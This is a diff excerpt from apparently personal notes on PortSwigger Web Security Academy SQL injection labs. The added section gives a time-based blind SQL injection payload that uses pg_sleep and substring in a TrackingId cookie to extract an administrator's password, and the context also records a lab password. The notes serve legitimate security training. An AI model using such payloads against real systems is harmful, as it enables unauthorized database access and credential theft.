@@ -62,3 +62,8 @@ solution: (using burp suite intruder) (note: I had to look at the solution help 
   (note: password will change after session expires, and will be unique for each lab-access. It is therefore necessary to use burp intruder to find the password before the session expires)
   password: 1mqhpjsgaib9671ahy4z
 
+[lab: Blind SQL injection with time delays]
+url: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
+solution: (note: had to look at solution help to realize that the '||' was needed and not 'union select')
+  step-1: TrackingId='||case when ((select count(username) from users where username='administrator' and substring(password,1,1) > '0') = 1) then pg_sleep(9) else pg_sleep(0) end--
+
